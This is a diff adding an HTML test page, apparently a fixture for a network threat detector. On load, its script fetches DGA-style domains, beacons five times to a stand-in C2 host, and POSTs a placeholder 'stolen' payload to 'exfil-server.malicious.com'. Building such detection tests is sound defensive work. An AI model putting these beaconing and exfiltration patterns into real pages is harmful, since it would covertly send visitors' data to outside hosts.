@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mixed Behavior Test</title>
+</head>
+<body>
+    <h1>Mixed Network Behavior Test</h1>
+    <p>This page combines multiple suspicious network behaviors:</p>
+    <ul>
+        <li>DGA-like domains</li>
+        <li>C2 beaconing pattern</li>
+        <li>Large payload transfers</li>
+    </ul>
+    <div id="status">Initializing mixed threat patterns...</div>
+    <div id="activity-log"></div>
+
+    <script>
+        const log = document.getElementById('activity-log');
+        const status = document.getElementById('status');
+
+        function logActivity(message) {
+            const p = document.createElement('p');
+            p.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            log.appendChild(p);
+        }
+
+        // 1. DGA Pattern - Request to algorithmically-generated domains
+        const dgaDomains = ['xyzabc123.com', 'def456ghi.net', 'jkl789mno.org'];
+        dgaDomains.forEach((domain, i) => {
+            setTimeout(() => {
+                fetch(`http://${domain}/api`, { mode: 'no-cors' })
+                    .catch(() => {});
+                logActivity(`DGA request to ${domain}`);
+            }, i * 1000);
+        });
+
+        // 2. C2 Beaconing - Regular periodic requests
+        let beaconCount = 0;
+        const beaconInterval = setInterval(() => {
+            if (beaconCount >= 5) {
+                clearInterval(beaconInterval);
+                return;
+            }
+            fetch('http://c2-server.suspicious.com/beacon', { mode: 'no-cors' })
+                .catch(() => {});
+            logActivity(`C2 beacon #${beaconCount + 1}`);
+            beaconCount++;
+        }, 5000);
+
+        // 3. Data Exfiltration - Large payload
+        setTimeout(() => {
+            const largeData = btoa(JSON.stringify({
+                stolen: 'sensitive data here'
+            }).repeat(50));
+
+            fetch('http://exfil-server.malicious.com/collect', {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify({ data: largeData })
+            }).catch(() => {});
+
+            logActivity(`Data exfiltration (${largeData.length} bytes)`);
+        }, 8000);
+
+        status.textContent = 'Mixed threat patterns active';
+        logActivity('Test initiated - monitoring for Sentinel alerts');
+    </script>
+</body>
+</html>
